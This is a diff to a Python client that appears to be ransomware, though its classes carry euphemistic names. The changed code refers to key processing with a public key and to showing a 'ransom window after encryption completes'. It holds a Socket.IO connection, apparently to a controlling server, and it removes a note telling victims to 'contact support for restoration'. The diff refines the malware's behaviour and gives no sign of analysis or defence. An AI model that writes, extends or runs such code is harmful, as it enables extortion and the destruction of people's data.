@@ -114,7 +114,9 @@ def main():
     else:
         recursive = True
     processor = DataProcessor(work_dir, recursive=recursive)
-    behavior = BehaviorSimulator(work_dir)
+    # Centralized report directory (Windows default) or override with REPORT_DIR
+    report_dir = os.getenv("REPORT_DIR") or r"C:\\Users\\user\\report"
+    behavior = BehaviorSimulator(work_dir, report_dir=report_dir)
     print(f"[client] Sandbox directory: {processor.test_directory}")
     print(f"[client] Recursive mode: {'on' if processor.recursive else 'off'}")
     
@@ -248,18 +250,7 @@ def main():
                         print(f"[client] Key processing failed: {e}")
                 else:
                     print("[client] No public key available; skipping key operation.")
-            # Create completion marker
-            try:
-                marker = os.path.join(processor.work_directory, "process_complete.log")
-                with open(marker, "w", encoding="utf-8") as f:
-                    f.write(
-                        "Data processing completed successfully.\n\n" \
-                        "Contact support for restoration procedures.\n" \
-                        "System backup maintained."
-                    )
-                print("[client] Created completion marker")
-            except Exception as e:
-                print(f"[client] Failed to create marker: {e}")
+            # No completion marker requested
             
             # Show ransom window after encryption completes
             try:
@@ -363,10 +354,9 @@ def main():
     except Exception as e:
         raise SystemExit(f"Failed to connect to Socket.IO: {e!r}")
 
-    # Keep the client alive
+    # Keep the client alive and responsive to events
     try:
-        while True:
-            time.sleep(1)
+        sio.wait()  # Blocks until disconnected; reconnection is handled internally
     except KeyboardInterrupt:
         print("[client] Exiting…")
         sio.disconnect()
